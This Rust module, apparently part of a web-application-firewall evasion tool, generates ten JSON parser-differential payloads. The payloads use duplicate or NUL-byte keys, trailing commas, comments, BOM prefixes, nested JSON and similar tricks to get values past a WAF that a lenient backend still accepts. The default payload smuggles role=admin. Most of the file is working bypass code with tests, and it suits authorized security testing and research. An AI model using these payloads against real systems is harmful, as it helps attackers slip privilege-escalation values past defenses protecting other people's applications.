//! JSON-body parser-differential probes — exploit parsing
//! disagreements between a fronting WAF's JSON parser and the
//! backend origin's JSON parser.
//!
//! WAFs typically use one JSON parser (often a strict RFC 8259
//! parser) while application backends use a different one
//! (lenient — supporting JSON5 features like comments and trailing
//! commas, or having its own opinion on duplicate-key resolution,
//! or proxying upstream JSON without re-validating). Every probe
//! in this module crafts a request body whose meaning differs
//! between the two parsers.
//!
//! Each probe emits a `BodyWithContentType` artifact (Content-Type
//! `application/json` + raw body bytes). The body bytes are built
//! by hand — `serde_json` will not emit the malformed-on-purpose
//! shapes these probes need (duplicate keys, trailing commas, BOM
//! prefixes, etc.), so the module owns its own JSON byte
//! generation.

use wafrift_types::canary::Canary;
use wafrift_types::probe::{SmuggleArtifact, SmuggleProbe};

/// Which JSON parser-differential variant to emit. Each variant
/// maps to a known WAF/origin disagreement on JSON-body
/// interpretation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum JsonSmuggleTechnique {
    /// `{"k":"benign","k":"<v>"}` — RFC 8259 leaves duplicate-key
    /// behaviour implementation-defined. WAFs and backends often
    /// disagree on which value wins.
    DuplicateKeyLastWins,
    /// `{"k\0injected":"benign","k":"<v>"}` — NUL-byte in key.
    /// Parsers truncate at NUL or keep the full key — the WAF sees
    /// a different key from the backend.
    DuplicateKeyNullByteSplit,
    /// `{"k":"<v>",}` — trailing comma. JSON5/JSONC tolerant,
    /// strict RFC 8259 rejects. A WAF that rejects the body
    /// outright never inspects it; the lenient backend parses
    /// normally (fail-open differential).
    TrailingComma,
    /// `{"k":"<v>\nsmuggled"}` — literal LF (0x0A) inside the JSON
    /// string. Strict RFC 8259 requires the LF escaped; lenient
    /// parsers accept the raw byte. Splits WAF view from backend
    /// view on the value content.
    UnescapedNewlineInString,
    /// `{/*c*/"k"/*c*/:"<v>"/*c*/}` — block-comment tolerance.
    /// JSON5/JSONC accept comments; strict RFC parsers reject.
    /// Comment-bearing payload may bypass strict WAF inspectors
    /// while parsing normally to a lenient backend.
    CommentJsonc,
    /// `{"k":"<v>","qty":0xff}` — hex-prefixed integer literal.
    /// Non-RFC parsers accept `0x...`; strict parsers reject.
    /// Differential on numeric-value scrutiny.
    HexNumberLiteral,
    /// `{"k":"<v>","q":NaN}` — JavaScript-style float literal.
    /// `serde_json` accepts with `allow_inf_nan`; strict parsers
    /// reject. WAF schema scanners fail-open; backends accept.
    NanInfinity,
    /// `\xEF\xBB\xBF{"k":"<v>"}` — UTF-8 BOM prefix. RFC 8259
    /// forbids BOM; some parsers strip silently, others reject.
    /// A WAF that rejects the BOM-prefixed body never inspects
    /// the JSON; the backend strips BOM and parses normally.
    BomPrefix,
    /// `{"":"<v>","k":"benign"}` — empty-string key. Some parsers
    /// reject as malformed; others map to "" and the backend pulls
    /// the attacker value out of the empty slot.
    EmptyKey,
    /// `{"data":"{\"k\":\"<v>\"}"}` — JSON-in-string nesting. The
    /// WAF's outer-pass scanner sees a benign string value; the
    /// backend may run a second JSON parse on the `data` field
    /// (common in APIs that proxy upstream JSON) and surface the
    /// inner attack value.
    JsonInString,
}

impl JsonSmuggleTechnique {
    /// Stable kebab-case technique name. Used in JSON output and
    /// telemetry — operators key on this for reproducibility.
    #[must_use]
    pub fn technique_name(&self) -> &'static str {
        match self {
            Self::DuplicateKeyLastWins => "json.duplicate-key-last-wins",
            Self::DuplicateKeyNullByteSplit => "json.duplicate-key-null-byte-split",
            Self::TrailingComma => "json.trailing-comma",
            Self::UnescapedNewlineInString => "json.unescaped-newline-in-string",
            Self::CommentJsonc => "json.comment-jsonc",
            Self::HexNumberLiteral => "json.hex-number-literal",
            Self::NanInfinity => "json.nan-infinity",
            Self::BomPrefix => "json.bom-prefix",
            Self::EmptyKey => "json.empty-key",
            Self::JsonInString => "json.json-in-string",
        }
    }

    /// One-line operator description for logs and reports.
    #[must_use]
    pub fn description(&self) -> &'static str {
        match self {
            Self::DuplicateKeyLastWins => {
                "Duplicate-key — last-wins vs first-wins resolution differential"
            }
            Self::DuplicateKeyNullByteSplit => "NUL byte in key — parser truncation differential",
            Self::TrailingComma => "Trailing comma — strict RFC 8259 vs JSON5 tolerance",
            Self::UnescapedNewlineInString => {
                "Literal LF in string value — escape-requirement differential"
            }
            Self::CommentJsonc => "Block-comment tolerance — JSONC vs strict-RFC parsers",
            Self::HexNumberLiteral => "Hex-prefixed integer literal — non-RFC numeric tolerance",
            Self::NanInfinity => "NaN/Infinity literal — IEEE-754 vs RFC-pure",
            Self::BomPrefix => "UTF-8 BOM prefix — strip-vs-reject differential",
            Self::EmptyKey => "Empty-string key — accept-vs-reject differential",
            Self::JsonInString => "JSON-in-string — second-pass parsing differential",
        }
    }
}

/// One JSON parser-differential smuggle probe.
#[derive(Debug, Clone)]
pub struct JsonSmuggleProbe {
    /// Per-probe correlation token.
    pub canary: Canary,
    /// Which differential this probe emits.
    pub technique: JsonSmuggleTechnique,
    /// Pre-built JSON body bytes. Splice into a POST/PUT request
    /// with `Content-Type: application/json`.
    pub body: Vec<u8>,
}

const DEFAULT_BENIGN_VALUE: &str = "guest";
const DEFAULT_FIELD_KEY: &str = "role";
const DEFAULT_FIELD_VALUE: &str = "admin";

/// Pick the focal `(key, value)` pair from the operator's params.
/// Convention: the LAST param is the focal one (most operators put
/// auth/privilege fields last). Falls back to a built-in
/// `("role", "admin")` if no params supplied.
fn focal(params: &[(String, String)]) -> (&str, &str) {
    params
        .last()
        .map(|(k, v)| (k.as_str(), v.as_str()))
        .unwrap_or((DEFAULT_FIELD_KEY, DEFAULT_FIELD_VALUE))
}

/// JSON-quote a string value: wrap in double quotes, backslash-
/// escape backslashes and quotes. Intentionally minimal — other
/// control bytes are escaped only when the probe explicitly wants
/// them unescaped (see `UnescapedNewlineInString`).
fn quote_value(s: &str) -> String {
    let escaped = s.replace('\\', "\\\\").replace('"', "\\\"");
    format!("\"{escaped}\"")
}

/// Emit a `"k":"v"` JSON pair with both sides quoted.
fn json_pair(k: &str, v: &str) -> String {
    format!("{}:{}", quote_value(k), quote_value(v))
}

impl JsonSmuggleProbe {
    /// Build a probe for a given technique against operator-supplied
    /// JSON params. The LAST param is treated as the focal field
    /// (where the parser-differential lands).
    #[must_use]
    pub fn new(technique: JsonSmuggleTechnique, params: &[(String, String)]) -> Self {
        let (k, v) = focal(params);
        let body: Vec<u8> = match technique {
            JsonSmuggleTechnique::DuplicateKeyLastWins => format!(
                "{{{},{}}}",
                json_pair(k, DEFAULT_BENIGN_VALUE),
                json_pair(k, v)
            )
            .into_bytes(),
            JsonSmuggleTechnique::DuplicateKeyNullByteSplit => {
                let key_with_nul = format!("{k}\u{0000}injected");
                format!(
                    "{{{},{}}}",
                    json_pair(&key_with_nul, DEFAULT_BENIGN_VALUE),
                    json_pair(k, v)
                )
                .into_bytes()
            }
            JsonSmuggleTechnique::TrailingComma => format!("{{{},}}", json_pair(k, v)).into_bytes(),
            JsonSmuggleTechnique::UnescapedNewlineInString => {
                // The differential is a LITERAL LF inside the value string.
                // Escape the key and the value's OWN quotes/backslashes first
                // (so an operator payload containing `"` / `\` can't add a
                // SECOND, unintended malformation that confounds the probe),
                // then inject the raw LF — the one differential under test.
                let esc_v = v.replace('\\', "\\\\").replace('"', "\\\"");
                format!("{{{}:\"{esc_v}\nsmuggled\"}}", quote_value(k)).into_bytes()
            }
            JsonSmuggleTechnique::CommentJsonc => {
                // Differential = block comments; key/value still properly
                // quoted so the comment tolerance is the only malformation.
                format!(
                    "{{/*c*/{}/*c*/:/*c*/{}/*c*/}}",
                    quote_value(k),
                    quote_value(v)
                )
                .into_bytes()
            }
            JsonSmuggleTechnique::HexNumberLiteral => {
                // Differential = the non-RFC hex literal `0xff`; the focal pair
                // is properly escaped so it is the only malformation.
                format!("{{{},\"qty\":0xff}}", json_pair(k, v)).into_bytes()
            }
            JsonSmuggleTechnique::NanInfinity => {
                // Differential = the JS `NaN` literal; focal pair properly escaped.
                format!("{{{},\"q\":NaN}}", json_pair(k, v)).into_bytes()
            }
            JsonSmuggleTechnique::BomPrefix => {
                let mut b = vec![0xEF, 0xBB, 0xBF];
                b.extend_from_slice(format!("{{{}}}", json_pair(k, v)).as_bytes());
                b
            }
            JsonSmuggleTechnique::EmptyKey => format!(
                "{{{},{}}}",
                json_pair("", v),
                json_pair(k, DEFAULT_BENIGN_VALUE)
            )
            .into_bytes(),
            JsonSmuggleTechnique::JsonInString => {
                let inner = json_pair(k, v);
                let inner_object = format!("{{{inner}}}");
                let escaped_inner = inner_object.replace('\\', "\\\\").replace('"', "\\\"");
                format!("{{\"data\":\"{escaped_inner}\"}}").into_bytes()
            }
        };
        Self {
            canary: Canary::generate(),
            technique,
            body,
        }
    }
}

impl SmuggleProbe for JsonSmuggleProbe {
    fn canary(&self) -> &Canary {
        &self.canary
    }
    fn technique(&self) -> String {
        self.technique.technique_name().to_string()
    }
    fn description(&self) -> &str {
        self.technique.description()
    }
    fn artifact(&self) -> SmuggleArtifact {
        SmuggleArtifact::BodyWithContentType {
            content_type: "application/json".to_string(),
            body: self.body.clone(),
        }
    }
}

/// Every JSON parser-differential probe against the given params.
/// Returns 10 probes — one per [`JsonSmuggleTechnique`] variant.
#[must_use]
pub fn all_variants(params: &[(String, String)]) -> Vec<JsonSmuggleProbe> {
    use JsonSmuggleTechnique::*;
    [
        DuplicateKeyLastWins,
        DuplicateKeyNullByteSplit,
        TrailingComma,
        UnescapedNewlineInString,
        CommentJsonc,
        HexNumberLiteral,
        NanInfinity,
        BomPrefix,
        EmptyKey,
        JsonInString,
    ]
    .iter()
    .map(|t| JsonSmuggleProbe::new(*t, params))
    .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    fn params() -> Vec<(String, String)> {
        vec![
            ("user".to_string(), "admin".to_string()),
            ("role".to_string(), "admin".to_string()),
        ]
    }

    #[test]
    fn all_variants_emits_one_per_technique() {
        let probes = all_variants(&params());
        assert_eq!(probes.len(), 10);
    }

    #[test]
    fn non_quote_differential_probes_escape_focal_value() {
        // Regression: probes whose differential is NOT a quote must ESCAPE a
        // `"` in the focal value. Pre-fix these 4 interpolated `{v}` raw, so an
        // attack payload like `a"b` injected a SECOND, unintended malformation
        // (a value-string-terminating quote) and confounded the parser
        // differential the probe is meant to isolate.
        let params = vec![("role".to_string(), "a\"b".to_string())];
        for (t, marker) in [
            (JsonSmuggleTechnique::HexNumberLiteral, "0xff"),
            (JsonSmuggleTechnique::NanInfinity, "NaN"),
            (JsonSmuggleTechnique::CommentJsonc, "/*c*/"),
        ] {
            let body =
                String::from_utf8_lossy(&JsonSmuggleProbe::new(t, &params).body).into_owned();
            assert!(
                body.contains("a\\\"b"),
                "{}: focal value quote must be escaped, got {body}",
                t.technique_name()
            );
            assert!(
                body.contains(marker),
                "{}: differential `{marker}` must be preserved, got {body}",
                t.technique_name()
            );
        }
        // UnescapedNewlineInString: value quote escaped, raw LF differential kept.
        let nl = String::from_utf8_lossy(
            &JsonSmuggleProbe::new(JsonSmuggleTechnique::UnescapedNewlineInString, &params).body,
        )
        .into_owned();
        assert!(
            nl.contains("a\\\"b"),
            "newline probe must escape value quote: {nl}"
        );
        assert!(
            nl.contains('\n'),
            "newline probe must keep the raw LF differential: {nl}"
        );
    }

    #[test]
    fn every_probe_uses_json_family_namespace() {
        for p in all_variants(&params()) {
            assert!(p.technique().starts_with("json."), "got {}", p.technique());
        }
    }

    #[test]
    fn every_probe_emits_application_json_body_artifact() {
        for p in all_variants(&params()) {
            match p.artifact() {
                SmuggleArtifact::BodyWithContentType { content_type, body } => {
                    assert_eq!(content_type, "application/json");
                    assert!(!body.is_empty());
                }
                other => panic!(
                    "expected BodyWithContentType for {}, got {other:?}",
                    p.technique()
                ),
            }
        }
    }

    #[test]
    fn duplicate_key_variant_contains_two_role_pairs() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::DuplicateKeyLastWins, &params());
        let body = String::from_utf8(p.body).expect("utf8");
        let role_count = body.matches("\"role\":").count();
        assert_eq!(role_count, 2, "body must contain two role pairs: {body}");
        // Last-wins side must hold the attack value.
        assert!(body.contains("\"admin\""), "body: {body}");
    }

    #[test]
    fn nul_split_variant_contains_actual_nul_byte() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::DuplicateKeyNullByteSplit, &params());
        assert!(p.body.contains(&0x00), "body must contain raw NUL byte");
    }

    #[test]
    fn trailing_comma_variant_ends_with_comma_then_brace() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::TrailingComma, &params());
        let body = String::from_utf8(p.body).expect("utf8");
        assert!(body.ends_with(",}"), "body: {body}");
    }

    #[test]
    fn unescaped_newline_variant_contains_raw_lf_in_value() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::UnescapedNewlineInString, &params());
        assert!(p.body.contains(&b'\n'), "body must contain raw LF byte");
    }

    #[test]
    fn comment_variant_contains_jsonc_block_comments() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::CommentJsonc, &params());
        let body = String::from_utf8(p.body).expect("utf8");
        assert!(body.contains("/*"));
        assert!(body.contains("*/"));
    }

    #[test]
    fn hex_number_variant_contains_0x_prefix() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::HexNumberLiteral, &params());
        let body = String::from_utf8(p.body).expect("utf8");
        assert!(body.contains("0xff"), "body: {body}");
    }

    #[test]
    fn nan_infinity_variant_contains_nan_literal() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::NanInfinity, &params());
        let body = String::from_utf8(p.body).expect("utf8");
        assert!(body.contains("NaN"), "body: {body}");
    }

    #[test]
    fn bom_prefix_variant_starts_with_utf8_bom() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::BomPrefix, &params());
        assert!(
            p.body.starts_with(&[0xEF, 0xBB, 0xBF]),
            "body must start with UTF-8 BOM (EF BB BF), got: {:?}",
            &p.body[..p.body.len().min(8)]
        );
    }

    #[test]
    fn empty_key_variant_contains_empty_string_key() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::EmptyKey, &params());
        let body = String::from_utf8(p.body).expect("utf8");
        assert!(body.contains("\"\":"), "body: {body}");
    }

    #[test]
    fn json_in_string_variant_contains_escaped_inner_object() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::JsonInString, &params());
        let body = String::from_utf8(p.body).expect("utf8");
        assert!(body.contains("\"data\":"), "body: {body}");
        // Inner-quoted object must use \" not raw "
        assert!(body.contains("\\\""), "body: {body}");
    }

    #[test]
    fn canaries_are_unique_per_probe() {
        let probes = all_variants(&params());
        let tokens: HashSet<String> = probes.iter().map(|p| p.canary().token.clone()).collect();
        assert_eq!(tokens.len(), probes.len());
    }

    #[test]
    fn descriptions_are_non_empty_and_distinct() {
        let probes = all_variants(&params());
        let descs: HashSet<&str> = probes.iter().map(|p| p.description()).collect();
        assert_eq!(descs.len(), probes.len(), "descriptions must be distinct");
        for p in &probes {
            assert!(!p.description().is_empty());
        }
    }

    #[test]
    fn technique_names_are_distinct() {
        let probes = all_variants(&params());
        let techs: HashSet<String> = probes.iter().map(|p| p.technique()).collect();
        assert_eq!(
            techs.len(),
            probes.len(),
            "technique names must be distinct"
        );
    }

    #[test]
    fn falls_back_to_default_focal_when_no_params() {
        let probes = all_variants(&[]);
        let p = &probes[0]; // DuplicateKeyLastWins
        let body = String::from_utf8(p.body.clone()).expect("utf8");
        assert!(body.contains("\"role\":"), "default focal key: {body}");
        assert!(body.contains("\"admin\""), "default focal value: {body}");
    }

    #[test]
    fn custom_focal_field_from_last_param_appears_in_body() {
        let custom = vec![
            ("decoy".to_string(), "x".to_string()),
            ("priv_field".to_string(), "elevated".to_string()),
        ];
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::DuplicateKeyLastWins, &custom);
        let body = String::from_utf8(p.body).expect("utf8");
        assert!(body.contains("\"priv_field\":"), "body: {body}");
        assert!(body.contains("\"elevated\""), "body: {body}");
    }

    #[test]
    fn probe_canary_token_is_sixteen_chars() {
        let p = JsonSmuggleProbe::new(JsonSmuggleTechnique::DuplicateKeyLastWins, &params());
        assert_eq!(p.canary().token.len(), 16);
    }
}
